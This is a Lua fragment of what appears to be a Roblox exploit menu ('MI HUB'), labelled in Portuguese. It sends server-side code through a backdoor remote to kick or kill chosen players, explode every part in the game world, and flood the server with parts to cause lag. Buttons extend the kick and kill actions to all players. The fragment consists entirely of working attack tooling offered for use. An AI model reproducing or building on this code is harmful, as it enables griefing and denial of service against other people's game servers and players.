tabAdmin:CreateSpacer(10)
local grpAcoes = tabAdmin:CreateGroup({Name = "Ações (Via Backdoor)"})

local function sendCmd(cmd, args)
    if not backdoorRemote then 
        win:Notify({Title = "Aviso", Content = "Rode o INJECT primeiro!", Duration = 3})
        return 
    end
    local code = ""
    if cmd == "kick" then
        code = string.format([[
            local p = game.Players:FindFirstChild("%s") 
            if p then p:Kick("%s") end
        ]], args.target, args.reason or "Kicked")
    elseif cmd == "kill" then
        code = string.format([[
            local p = game.Players:FindFirstChild("%s")
            if p and p.Character then p.Character:BreakJoints() end
        ]], args.target)
    elseif cmd == "explode" then
        code = [[
            for _, v in ipairs(workspace:GetDescendants()) do
                if v:IsA("BasePart") then
                    local ex = Instance.new("Explosion")
                    ex.Position = v.Position
                    ex.Parent = workspace
                end
            end
        ]]
    elseif cmd == "lag" then
        code = [[
            for i = 1, 100 do
                task.spawn(function()
                    local p = Instance.new("Part")
                    p.Size = Vector3.new(100,100,100)
                    p.Position = Vector3.new(math.random(-1000,1000), math.random(100,500), math.random(-1000,1000))
                    p.Anchored = false
                    p.Parent = workspace
                    task.delay(3, function() if p then p:Destroy() end end)
                end)
            end
        ]]
    end
    
    pcall(function()
        if backdoorRemote:IsA("RemoteEvent") then
            backdoorRemote:FireServer(code)
        else
            backdoorRemote:InvokeServer(code)
        end
    end)
    win:Notify({Title = "Executado", Content = "Comando enviado.", Duration = 2})
end

grpAcoes:CreateButton({Name = "Kick Alvo", Icon = "user-x", Callback = function() 
    if selectedTarget == "ALL" then
        for _, p in ipairs(Players:GetPlayers()) do if p ~= LP then p:Kick("Kicked by MI HUB") end end
    else
        sendCmd("kick", {target = selectedTarget}) 
    end
end})
grpAcoes:CreateButton({Name = "Matar Alvo", Icon = "skull", Callback = function() 
    if selectedTarget == "ALL" then
        for _, p in ipairs(Players:GetPlayers()) do if p ~= LP and p.Character then p.Character:BreakJoints() end end
    else
        sendCmd("kill", {target = selectedTarget}) 
    end
end})


